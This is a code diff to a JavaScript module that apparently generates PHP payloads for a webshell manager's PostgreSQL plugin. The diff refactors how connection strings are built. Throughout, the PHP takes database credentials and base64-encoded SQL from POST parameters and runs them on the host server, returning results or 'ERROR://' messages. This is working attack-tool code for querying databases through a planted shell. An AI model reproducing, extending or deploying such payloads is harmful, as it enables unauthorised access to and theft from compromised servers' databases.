@@ -11,20 +11,9 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      $arr=array(
-        'host'=>split(':',$hst)[0],
-        'port'=>split(':',$hst)[1],
-        'user'=>$usr,
-        'password'=>$pwd,
-      );
-      $cs='';
-      foreach($arr as $k=>$v) {
-        if(empty($v)){
-            continue;
-        }
-        $cs .= "$k=$v ";
-     }
-      $T=@pg_connect($cs);
+      $host=split(':',$hst)[0];
+      $port=split(':',$hst)[1];
+      $T=@pg_connect("host={$host} port={$port} dbname=postgres user={$usr} password={$pwd}");
       if(!$T){
         echo("ERROR://".@pg_last_error());
       }else{
@@ -51,21 +40,9 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      $arr=array(
-        'host'=>split(':',$hst)[0],
-        'port'=>split(':',$hst)[1],
-        'user'=>$usr,
-        'password'=>$pwd,
-        'dbname'=>$dbn,
-      );
-      $cs='';
-      foreach($arr as $k=>$v) {
-        if(empty($v)){
-            continue;
-        }
-        $cs .= "$k=$v ";
-     }
-      $T=@pg_connect($cs);
+      $host=split(':',$hst)[0];
+      $port=split(':',$hst)[1];
+      $T=@pg_connect("host={$host} port={$port} dbname=$dbn user={$usr} password={$pwd}");
       if(!$T){
         echo("ERROR://".@pg_last_error());
       }else{
@@ -94,21 +71,9 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
-      $arr=array(
-        'host'=>split(':',$hst)[0],
-        'port'=>split(':',$hst)[1],
-        'user'=>$usr,
-        'password'=>$pwd,
-        'dbname'=>$dbn,
-      );
-      $cs='';
-      foreach($arr as $k=>$v) {
-        if(empty($v)){
-            continue;
-        }
-        $cs .= "$k=$v ";
-     }
-      $T=@pg_connect($cs);
+      $host=split(':',$hst)[0];
+      $port=split(':',$hst)[1];
+      $T=@pg_connect("host={$host} port={$port} dbname=$dbn user={$usr} password={$pwd}");
       if(!$T){
         echo("ERROR://".@pg_last_error());
       }else{
@@ -140,21 +105,9 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
       $encode=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];
-      $arr=array(
-        'host'=>split(':',$hst)[0],
-        'port'=>split(':',$hst)[1],
-        'user'=>$usr,
-        'password'=>$pwd,
-        'dbname'=>$dbn,
-      );
-      $cs='';
-      foreach($arr as $k=>$v) {
-        if(empty($v)){
-            continue;
-        }
-        $cs .= "$k=$v ";
-      }
-      $T=@pg_connect($cs);
+      $host=split(':',$hst)[0];
+      $port=split(':',$hst)[1];
+      $T=@pg_connect("host={$host} port={$port} dbname=$dbn user={$usr} password={$pwd}");
       if(!$T){
         echo("ERROR://".@pg_last_error());
       }else{
